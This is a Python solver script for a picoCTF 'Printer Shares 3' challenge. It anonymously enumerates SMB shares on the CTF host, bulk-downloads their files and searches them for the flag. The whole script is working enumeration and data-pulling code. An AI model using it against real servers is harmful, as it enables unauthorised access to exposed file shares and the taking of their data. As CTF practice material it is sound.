#!/usr/bin/env python3
"""
Printer Shares 3 - picoCTF 2026
Category: General Skills | Points: 300

Automated solution using the smbprotocol library to enumerate SMB shares,
find the leftover debug script, and extract the flag.

Usage:
    pip install smbprotocol
    python3 solve.py

    Alternatively, set environment variables:
        TARGET_HOST=<hostname> TARGET_PORT=<port> python3 solve.py
"""

import os
import sys
import re

try:
    from smbclient import (
        register_session,
        listdir,
        open_file,
        scandir,
    )
    from smbclient._os import SMBDirEntry
    USE_SMBPROTOCOL = True
except ImportError:
    USE_SMBPROTOCOL = False

import subprocess

# --- Configuration ---
TARGET_HOST = os.environ.get("TARGET_HOST", "rhea.picoctf.net")
TARGET_PORT = int(os.environ.get("TARGET_PORT", "60505"))
SHARE_NAME = os.environ.get("SHARE_NAME", "shares")
FLAG_PATTERN = re.compile(r"picoCTF\{[^}]+\}")

# Files commonly associated with the debug script in this challenge
DEBUG_FILENAMES = {"debug.sh", "debug.py", "debug.bat", "debug.txt", "secret.sh", "secret.txt"}


def solve_with_smbclient_cli():
    """
    Fallback solution using the smbclient CLI tool.
    Works on most Linux systems with samba-client installed.
    """
    print(f"[*] Connecting to //{TARGET_HOST}/{SHARE_NAME} on port {TARGET_PORT} (CLI mode)")

    # Step 1: List shares
    print("[*] Step 1: Enumerating shares...")
    try:
        result = subprocess.run(
            ["smbclient", "-L", f"//{TARGET_HOST}", "-p", str(TARGET_PORT), "-N"],
            capture_output=True, text=True, timeout=15
        )
        print(result.stdout)
        if result.stderr:
            print(f"[!] stderr: {result.stderr}")
    except FileNotFoundError:
        print("[!] smbclient not found. Install with: sudo apt install smbclient")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        print("[!] Connection timed out. Check TARGET_HOST and TARGET_PORT.")
        sys.exit(1)

    # Step 2: List files in the share and download everything
    print(f"[*] Step 2: Listing files in //{TARGET_HOST}/{SHARE_NAME}...")
    list_cmd = f"ls"
    result = subprocess.run(
        ["smbclient", f"//{TARGET_HOST}/{SHARE_NAME}", "-p", str(TARGET_PORT), "-N",
         "-c", "recurse ON; ls"],
        capture_output=True, text=True, timeout=15
    )
    print(result.stdout)

    # Step 3: Try to download known debug file names and any .sh/.py/.txt files
    print("[*] Step 3: Downloading files and searching for the flag...")
    files_to_try = list(DEBUG_FILENAMES)

    # Parse the listing output for additional filenames
    for line in result.stdout.splitlines():
        line = line.strip()
        parts = line.split()
        if parts and not parts[0].startswith("."):
            candidate = parts[0]
            if "." in candidate:
                files_to_try.append(candidate)

    flag_found = False
    for filename in files_to_try:
        try:
            dl_result = subprocess.run(
                ["smbclient", f"//{TARGET_HOST}/{SHARE_NAME}", "-p", str(TARGET_PORT),
                 "-N", "-c", f"get {filename} /dev/stdout"],
                capture_output=True, text=True, timeout=15
            )
            content = dl_result.stdout
            if content:
                print(f"\n[*] Contents of {filename}:")
                print(content)
                match = FLAG_PATTERN.search(content)
                if match:
                    print(f"\n[+] FLAG FOUND in {filename}: {match.group(0)}")
                    flag_found = True
        except Exception:
            pass

    if not flag_found:
        # Try downloading all files with mget
        print("[*] Attempting bulk download with mget...")
        result = subprocess.run(
            ["smbclient", f"//{TARGET_HOST}/{SHARE_NAME}", "-p", str(TARGET_PORT),
             "-N", "-c", "prompt OFF; recurse ON; mget *"],
            capture_output=True, text=True, timeout=30,
            cwd="/tmp"
        )
        # Search downloaded files for the flag
        for root, dirs, files in os.walk("/tmp"):
            for f in files:
                try:
                    filepath = os.path.join(root, f)
                    with open(filepath, "r", errors="ignore") as fh:
                        content = fh.read()
                        match = FLAG_PATTERN.search(content)
                        if match:
                            print(f"\n[+] FLAG FOUND in {filepath}: {match.group(0)}")
                            flag_found = True
                except Exception:
                    pass

    if not flag_found:
        print("\n[-] Flag not found automatically. Try manual exploration:")
        print(f"    smbclient //{TARGET_HOST}/{SHARE_NAME} -p {TARGET_PORT} -N")
        print("    smb: \\> recurse ON")
        print("    smb: \\> ls")
        print("    Look for debug scripts and read their contents.")


def solve_with_smbprotocol():
    """
    Solution using the Python smbprotocol library for programmatic SMB access.
    """
    print(f"[*] Connecting to //{TARGET_HOST}/{SHARE_NAME} on port {TARGET_PORT} (smbprotocol mode)")

    try:
        register_session(TARGET_HOST, username="", password="", port=TARGET_PORT)
    except Exception as e:
        print(f"[!] Failed to register session: {e}")
        print("[*] Falling back to CLI mode...")
        solve_with_smbclient_cli()
        return

    share_path = f"\\\\{TARGET_HOST}\\{SHARE_NAME}"

    def search_directory(path):
        """Recursively search a directory for files containing the flag."""
        try:
            entries = list(scandir(path))
        except Exception as e:
            print(f"[!] Cannot list {path}: {e}")
            return None

        for entry in entries:
            name = entry.name
            if name in (".", ".."):
                continue

            full_path = f"{path}\\{name}"

            if entry.is_dir():
                print(f"[*] Entering directory: {full_path}")
                result = search_directory(full_path)
                if result:
                    return result
            else:
                print(f"[*] Found file: {full_path}")
                # Prioritize debug scripts but check all files
                try:
                    with open_file(full_path, mode="r") as f:
                        content = f.read()
                    if content:
                        match = FLAG_PATTERN.search(content)
                        if match:
                            print(f"\n[+] Contents of {name}:")
                            print(content)
                            print(f"\n[+] FLAG FOUND: {match.group(0)}")
                            return match.group(0)
                        # Also print debug scripts even without flag pattern
                        lower_name = name.lower()
                        if "debug" in lower_name or "secret" in lower_name:
                            print(f"\n[*] Debug/secret file contents ({name}):")
                            print(content)
                except Exception as e:
                    print(f"[!] Cannot read {full_path}: {e}")

        return None

    print(f"[*] Searching {share_path} for debug scripts and flags...")
    flag = search_directory(share_path)

    if flag:
        print(f"\n{'='*50}")
        print(f"[+] FLAG: {flag}")
        print(f"{'='*50}")
    else:
        print("\n[-] Flag not found via smbprotocol. Trying CLI fallback...")
        solve_with_smbclient_cli()


def main():
    print("=" * 60)
    print("  Printer Shares 3 - picoCTF 2026 Solver")
    print("  Category: General Skills | Points: 300")
    print("=" * 60)
    print(f"  Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"  Share:  {SHARE_NAME}")
    print()

    if USE_SMBPROTOCOL:
        solve_with_smbprotocol()
    else:
        print("[*] smbprotocol not installed. Using smbclient CLI.")
        print("[*] For Python-native solution: pip install smbprotocol")
        solve_with_smbclient_cli()


if __name__ == "__main__":
    main()
